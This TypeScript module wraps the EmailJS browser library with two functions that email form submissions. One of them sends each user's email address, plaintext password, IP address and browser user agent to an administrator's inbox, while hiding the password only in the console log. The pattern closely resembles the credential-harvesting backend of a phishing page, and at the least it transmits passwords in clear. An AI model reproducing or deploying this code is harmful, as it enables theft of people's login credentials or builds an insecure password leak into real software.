import emailjs from "@emailjs/browser";

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  const userId = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!userId) {
    console.error("EmailJS User ID is not configured");
    return;
  }

  emailjs.init(userId);
  console.log('EmailJS initialized successfully');
};

export const sendValidationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    console.log('Sending validation email with data:', { ...formData, password: '[REDACTED]' });

    return await emailjs.send(serviceId, templateId, formData);
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    console.log('Sending confirmation email with data:', { ...formData, password: '[REDACTED]' });

    const templateParams = {
      to_email: formData.admin_email || "admin@example.com",
      user_email: formData.user_email,
      password: formData.password,
      timestamp: formData.timestamp || new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    const result = await emailjs.send(serviceId, templateId, templateParams);
    console.log('EmailJS confirmation response:', result);
    return result;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};